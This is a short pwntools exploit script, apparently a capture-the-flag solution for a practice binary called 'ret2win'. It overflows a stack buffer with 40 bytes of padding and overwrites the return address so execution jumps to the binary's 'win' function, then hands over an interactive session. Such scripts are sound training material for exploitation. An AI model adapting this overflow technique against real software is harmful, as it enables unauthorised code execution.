#!/usr/bin/python3

from pwn import *
exe = ELF("./ret2win")
p = process(exe.path)
#p = gdb.debug(exe.path,"b* vuln+51 \n c")
payload = b'A'*40
payload += p64(exe.sym['win']+5)
p.sendlineafter("> ",payload)

p.interactive()